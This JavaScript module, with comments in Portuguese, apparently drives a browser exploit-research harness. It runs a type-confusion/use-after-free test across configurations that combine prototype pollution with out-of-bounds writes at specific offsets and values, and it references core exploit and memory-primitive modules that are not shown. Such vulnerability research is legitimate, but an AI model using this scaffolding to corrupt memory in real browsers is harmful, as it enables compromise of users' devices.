// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { KNOWN_STRUCTURE_IDS } from '../config.mjs'; // Para usar IDs de estrutura conhecidos

// Importe a função de teste modificada
import { testJsonTypeConfusionUAFSpeculative } from './testJsonTypeConfusionUAFSpeculative.mjs';

// Outros imports que você possa querer reativar depois:
// import { testWebAssemblyInterface } from './testWebAssemblyInterface.mjs';
// import { testSharedArrayBufferSupport } from './testSharedArrayBufferSupport.mjs';
// import { explainMemoryPrimitives } from './explainMemoryPrimitives.mjs';
// import { testCoreExploitModule } from '../core_exploit.mjs';
// import { testCorruptArrayBufferStructure } from './testCorruptArrayBufferStructure.mjs';


export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_Isolado';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Testes Avançados Isolados (testJsonTypeConfusionUAFSpeculative) ====\n`, 'test', FNAME);

    // --- Defina aqui as configurações de teste que você quer rodar ---
    const testsToRun = [
        
        { // 2. Apenas Poluição de Protótipo (PP), sem escrita OOB
            iterationName: "OnlyPP",
            enablePrototypePollution: true,
            enableOOBWrite: false, // OOB desabilitado
            // corruption_offset e value_to_write não serão usados
        },
        { // 3. Apenas escrita OOB (no offset problemático), sem PP
            iterationName: "OnlyOOB_0x70_FFFFFFFF",
            enablePrototypePollution: false, // PP desabilitada
            enableOOBWrite: true,
            corruption_offset: 0x70,
            value_to_write: 0xFFFFFFFF,
            bytes_to_write_for_corruption: 4,
        },
        { // 4. PP + OOB, mas com offset ligeiramente diferente (antes)
            iterationName: "PP_OOB_Offset_0x6C",
            enablePrototypePollution: true,
            enableOOBWrite: true,
            corruption_offset: 0x6C, // Novo offset
            value_to_write: 0xFFFFFFFF,
            bytes_to_write_for_corruption: 4,
        },
        { // 5. PP + OOB, mas com offset ligeiramente diferente (depois)
            iterationName: "PP_OOB_Offset_0x74",
            enablePrototypePollution: true,
            enableOOBWrite: true,
            corruption_offset: 0x74, // Novo offset
            value_to_write: 0xFFFFFFFF,
            bytes_to_write_for_corruption: 4,
        },
        { // 6. PP + OOB (offset original), mas com valor 0x0
            iterationName: "PP_OOB_0x70_Value_0x0",
            enablePrototypePollution: true,
            enableOOBWrite: true,
            corruption_offset: 0x70,
            value_to_write: 0x00000000, // Novo valor
            bytes_to_write_for_corruption: 4,
        },
        { // 7. PP + OOB (offset original), mas com valor 0x41414141
            iterationName: "PP_OOB_0x70_Value_0x41414141",
            enablePrototypePollution: true,
            enableOOBWrite: true,
            corruption_offset: 0x70,
            value_to_write: 0x41414141, // Novo valor
            bytes_to_write_for_corruption: 4,
        },
        // ADICIONE MAIS CASOS DE TESTE AQUI
        // Exemplo: Testando um StructureID conhecido (lembre-se de preencher em config.mjs)
        // {
        //     iterationName: "PP_OOB_0x70_ArrayBufferID",
        //     enablePrototypePollution: true,
        //     enableOOBWrite: true,
        //     corruption_offset: 0x70,
        //     value_to_write: parseInt(KNOWN_STRUCTURE_IDS.TYPE_ARRAY_BUFFER, 16) || 0xDEADBEEF, // Fallback se não definido
        //     bytes_to_write_for_corruption: 4,
        // },
    ];

    for (const testConfig of testsToRun) {
        logS3(`\n--- Iniciando Iteração de Teste: ${testConfig.iterationName} ---\n`, 'test', FNAME);
        await testJsonTypeConfusionUAFSpeculative(testConfig);
        logS3(`\n--- Iteração ${testConfig.iterationName} Finalizada. Pausando... ---\n`, 'test', FNAME);
        await PAUSE_S3(MEDIUM_PAUSE_S3 * 2); // Pausa mais longa entre os testes isolados
        if (outputDiv.innerHTML.length > 500000) { // Simples checagem para não sobrecarregar o log div
            logS3("Log DIV está grande, considere limpar ou testar menos iterações de uma vez.", "warn", FNAME);
           // outputDiv.innerHTML = ""; // Descomente para limpar o log entre grandes blocos de teste
        }
    }

    // Para reativar outros testes do Script 3, descomente abaixo e os imports no topo:
    // logS3("\n--- Outros Testes Avançados ---", 'test', FNAME);
    // await testWebAssemblyInterface();
    // await PAUSE_S3(MEDIUM_PAUSE_S3);
    // await testSharedArrayBufferSupport();
    // await PAUSE_S3(MEDIUM_PAUSE_S3);
    // explainMemoryPrimitives();
    // await PAUSE_S3(SHORT_PAUSE_S3);
    // await testCorruptArrayBufferStructure();
    // await PAUSE_S3(MEDIUM_PAUSE_S3);
    // await testCoreExploitModule(logS3);
    // await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3("\n==== Script 3 CONCLUÍDO (Testes Isolados - Modular) ====", 'test', FNAME);
    if (runBtn) runBtn.disabled = false;
}
